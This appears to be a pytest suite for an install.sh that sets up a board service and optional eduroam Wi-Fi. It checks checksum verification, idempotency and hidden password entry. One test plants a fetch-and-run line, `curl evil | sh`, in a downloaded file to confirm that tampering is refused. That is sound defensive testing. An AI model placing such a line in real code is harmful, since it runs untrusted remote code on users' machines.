"""install.sh, dry-run: fake systemctl, nmcli, curl, sudo and apt-get on PATH, everything installed into a
temp dir. Covers the piped `curl ... | sh` path, hash checks, idempotency, and the eduroam prompt (through a
pseudo-terminal, as App Lab's terminal or ssh would give it)."""

from __future__ import annotations

import os
import pty
import select
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent.parent
SITE = HERE.parents[2] / "site" / "public" / "unoq"

FAKES = {
    "sudo": '#!/bin/sh\nexec "$@"\n',
    "systemctl": '#!/bin/sh\necho "systemctl $*" >> "$FAKE_LOG"\n'
                 '[ "$1" = is-enabled ] && [ "$2" = kite-hello ] && exit 0\nexit 0\n',
    "nmcli": '#!/bin/sh\nif [ "$1" = -t ]; then echo "wlan0:wifi"; echo "lo:loopback"; exit 0; fi\n'
             'echo "nmcli $*" >> "$FAKE_LOG"\nexit 0\n',
    "apt-get": '#!/bin/sh\necho "apt-get $*" >> "$FAKE_LOG"\nexit 0\n',
    "chown": '#!/bin/sh\necho "chown $*" >> "$FAKE_LOG"\nexit 0\n',
    "hostname": '#!/bin/sh\necho "10.142.7.9 100.101.5.6"\n',
    "curl": """#!/bin/sh
out=""; url=""
while [ $# -gt 0 ]; do
  case "$1" in -o) out="$2"; shift 2 ;; -*) shift ;; *) url="$1"; shift ;; esac
done
echo "curl $url" >> "$FAKE_LOG"
case "$url" in */health) exit 0 ;; esac
f="$FAKE_SITE/$(basename "$url")"
[ -f "$f" ] || exit 22
if [ -n "$out" ]; then cp "$f" "$out"; else cat "$f"; fi
""",
}


@pytest.fixture
def env(tmp_path):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    for name, body in FAKES.items():
        p = bin_dir / name
        p.write_text(body)
        p.chmod(0o755)
    site = tmp_path / "site"
    shutil.copytree(SITE, site)
    e = {
        "PATH": f"{bin_dir}:{os.environ['PATH']}", "HOME": str(tmp_path), "FAKE_LOG": str(tmp_path / "log"),
        "FAKE_SITE": str(site), "KITE_BASE_URL": "https://trykite.pages.dev/unoq", "KITE_USER": "arduino",
        "KITE_INSTALL_DIR": str(tmp_path / "home/arduino/kite-link"), "KITE_ETC_DIR": str(tmp_path / "etc/kite"),
        "KITE_UNIT_DIR": str(tmp_path / "etc/systemd/system"), "KITE_SKIP_APT": "1", "LANG": "C.UTF-8",
    }
    (tmp_path / "log").write_text("")
    return tmp_path, e


def piped(tmp: Path, e: dict, args: str = "") -> subprocess.CompletedProcess:
    """`curl ... | sh` with no controlling terminal (a new session), from a folder with nothing in it."""
    work = tmp / "cwd"
    work.mkdir(exist_ok=True)
    cmd = f'cat "{SITE / "install.sh"}" | sh -s -- {args}'
    return subprocess.run(["sh", "-c", cmd], cwd=work, env=e, capture_output=True, text=True, timeout=60,
                          stdin=subprocess.DEVNULL, start_new_session=True)


def test_published_files_match_the_source():
    r = subprocess.run([sys.executable, str(HERE / "publish.py"), "--check"], capture_output=True, text=True)
    assert r.returncode == 0, r.stdout


def test_piped_install_without_a_terminal(env):
    tmp, e = env
    r = piped(tmp, e)
    assert r.returncode == 0, r.stderr + r.stdout
    out, log = r.stdout, (tmp / "log").read_text()
    assert "downloaded and verified: board.py kite_common.py kite-link.service" in out
    for f in ("board.py", "kite_common.py", "kite-link.service"):
        assert f"curl https://trykite.pages.dev/unoq/{f}" in log
    inst = tmp / "home/arduino/kite-link"
    assert (inst / "board.py").read_bytes() == (HERE / "board.py").read_bytes()
    assert (inst / "kite_common.py").read_bytes() == (HERE / "kite_common.py").read_bytes()
    unit = (tmp / "etc/systemd/system/kite-link.service").read_text()
    assert f"ExecStart=/usr/bin/python3 {inst}/board.py" in unit and "User=arduino" in unit and "__" not in unit
    token = (tmp / "etc/kite/token").read_text().strip()
    assert len(token) == 32 and oct((tmp / "etc/kite/token").stat().st_mode)[-3:] == "600"
    assert "systemctl disable --now kite-hello" in log            # the old hello sender is retired
    assert "systemctl enable kite-link" in log and "systemctl restart kite-link" in log
    assert "no terminal to ask about eduroam" in out and "sh -s -- --eduroam" in out
    assert "nmcli" not in log
    assert f"token:    {token}" in out and "board IP: 10.142.7.9" in out
    assert out.rstrip().endswith("done: on the computer run  python kite_link.py doctor")


def test_install_is_idempotent_and_keeps_the_token(env):
    tmp, e = env
    assert piped(tmp, e).returncode == 0
    token = (tmp / "etc/kite/token").read_text()
    r = piped(tmp, e)
    assert r.returncode == 0 and "made a new token" not in r.stdout
    assert (tmp / "etc/kite/token").read_text() == token


def test_a_tampered_download_is_refused(env):
    tmp, e = env
    p = Path(e["FAKE_SITE"]) / "board.py"
    p.write_text(p.read_text() + "\nimport os; os.system('curl evil | sh')\n")
    r = piped(tmp, e)
    assert r.returncode != 0 and "checksum mismatch for board.py" in r.stderr
    assert not (tmp / "home/arduino/kite-link/board.py").exists()
    assert "systemctl" not in (tmp / "log").read_text()


def test_a_missing_download_is_reported(env):
    tmp, e = env
    (Path(e["FAKE_SITE"]) / "kite_common.py").unlink()
    r = piped(tmp, e)
    assert r.returncode != 0 and "couldn't download https://trykite.pages.dev/unoq/kite_common.py" in r.stderr


def test_run_from_a_checkout_uses_the_local_files(env):
    tmp, e = env
    r = subprocess.run(["sh", str(HERE / "install.sh"), "--no-eduroam"], env=e, capture_output=True, text=True,
                       timeout=60, stdin=subprocess.DEVNULL, start_new_session=True)
    assert r.returncode == 0, r.stderr
    assert "curl https://" not in (tmp / "log").read_text()
    assert "eduroam" not in r.stdout.split("token:")[1].split("done:")[0]


def test_unknown_option(env):
    tmp, e = env
    r = piped(tmp, e, "--bogus")
    assert r.returncode != 0 and "unknown option --bogus" in r.stderr


def test_eduroam_alone_needs_a_terminal(env):
    tmp, e = env
    r = piped(tmp, e, "--eduroam")
    assert r.returncode != 0 and "needs a terminal" in r.stderr


def on_pty(tmp: Path, e: dict, answers: list[tuple[str, str]], args: str = "") -> tuple[int, str]:
    """Run `cat install.sh | sh` with a pseudo-terminal as its controlling terminal, typing each answer
    when its prompt appears. Returns (exit code, everything the terminal showed)."""
    work = tmp / "cwd"
    work.mkdir(exist_ok=True)
    pid, fd = pty.fork()
    if pid == 0:                                    # child: stdin is the pipe, /dev/tty is the pty
        os.chdir(work)
        os.execvpe("sh", ["sh", "-c", f'cat "{SITE / "install.sh"}" | sh -s -- {args}'], e)
    shown, pending = b"", list(answers)
    deadline = time.monotonic() + 60
    while time.monotonic() < deadline:
        r, _, _ = select.select([fd], [], [], 0.2)
        if r:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break
            if not chunk:
                break
            shown += chunk
        if pending and pending[0][0].encode() in shown:
            prompt, answer = pending.pop(0)
            shown = shown.replace(prompt.encode(), f"[{prompt}]".encode(), 1)   # match each prompt once
            time.sleep(0.1)
            os.write(fd, answer.encode() + b"\n")
    _, status = os.waitpid(pid, 0)
    os.close(fd)
    return os.waitstatus_to_exitcode(status), shown.decode(errors="replace")


def test_eduroam_prompt_through_a_terminal_hides_the_password(env):
    tmp, e = env
    rc, shown = on_pty(tmp, e, [("Join eduroam now? [y/N]", "y"), ("eduroam username", "oski@berkeley.edu"),
                                ("eduroam password (hidden)", "s3cret-Passw0rd"), ("school domain", "")])
    log = (tmp / "log").read_text()
    assert rc == 0, shown
    assert "802-1x.identity oski@berkeley.edu" in log and "802-1x.password s3cret-Passw0rd" in log
    assert "802-1x.domain-suffix-match berkeley.edu" in log and "anonymous@berkeley.edu" in log
    assert "ifname wlan0 ssid eduroam" in log and "nmcli connection up eduroam" in log
    assert "s3cret-Passw0rd" not in shown                        # typed with echo off
    assert "joined eduroam on wlan0" in shown and "done: on the computer run" in shown


def test_eduroam_prompt_declined(env):
    tmp, e = env
    rc, shown = on_pty(tmp, e, [("Join eduroam now? [y/N]", "")])
    assert rc == 0 and "not joining eduroam" in shown and "nmcli" not in (tmp / "log").read_text()


def test_eduroam_only_with_another_school(env):
    tmp, e = env
    rc, shown = on_pty(tmp, e, [("eduroam username", "me@mit.edu"), ("eduroam password (hidden)", "pw-12345"),
                                ("school domain", "mit.edu")], args="--eduroam")
    log = (tmp / "log").read_text()
    assert rc == 0, shown
    assert "802-1x.domain-suffix-match mit.edu" in log and "systemctl" not in log
